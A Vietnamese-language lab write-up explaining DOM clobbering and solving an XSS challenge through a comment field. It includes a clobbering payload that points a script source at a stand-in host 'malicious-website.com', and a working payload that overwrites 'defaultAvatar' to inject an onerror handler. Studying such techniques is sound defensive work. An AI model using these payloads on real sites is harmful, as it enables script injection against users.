# Exploiting DOM clobbering to enable XSS 

Dom clobbering đưa HTML vào trang để thao tác với DOM và thay đổi hành vi của Javascript trên trang. Khi người dùng có thể kiểm soát các thuộc tính thuộc whitelists chẳng hạn như `id` hoặc `name` . Hình thức phổ biến nhất là sử dụng phần tử anchor để ghi đề biến toàn cục và sau đó biến sẽ được sử dụng để khai thác DOM.

Một số nhà phát triển Javascript thường code như sau:

``` javascript
var someObject = window.someObject || {}
```

Nếu chúng ta có thể kiểm soát một số HTML đầu vào thì có thể ngắt một đối tượng hay còn gọi là clobbering và tham chiếu đến một node DOM, chẳng hạn như đoạn code ví dụ sau:

```javascript
<script>
 window.onload = function(){
    let someObject = window.someObject || {};
    let script = document.createElement('script');
    script.src = someObject.url;
    document.body.appendChild(script);
 };
</script>
```

Từ đoạn code dễ bị tấn công này chúng ta có thể chèn vào HTML để hủy đối tượng nào đó tham chiếu đến phần từ anchor:

``` html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/malicious.js>
```

Bởi vì hai ID giống nhau được sử dụng, DOM sẽ nhóm chúng thành một tập hợp và sau đó DOM destruction sẽ sử dụng tập hợp này để ghi đè tham chiếu đối tượng đó. Thuộc tính name được sử dụng trong anchor để ngắt thuộc tính URL của đối tượng `someObject` và trỏ đến một tập lệnh bên ngoài.

Quay trở lại với challenge này, chức năng bình luận trên trang cho phép sử dụng HTML để comment, nhưng không cho phép các thẻ thực thi Javascript. View page source và thấy trong đó có một file là `resources/js/loadCommentsWithDomClobbering.js` 

Chúng ta sẽ nhận ra ngay nó sẽ na ná giống với đoạn code bị lỗi bên trên

![image](https://user-images.githubusercontent.com/68894302/176596455-4a0d9116-fe24-4f33-86dd-89ee4f049a48.png)

Đoạn code này chúng ta có thể sử dụng phương pháp trên để overwrite lên đối tượng `defaultAvatar` như sau

``` html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid;&quot;onerror=alert()//">
```

Sau đó tthêm 1 lần comment để triaged lỗ hổng

![image](https://user-images.githubusercontent.com/68894302/176645628-eadc6ef3-9d93-4810-9c51-54fb7cc48eff.png)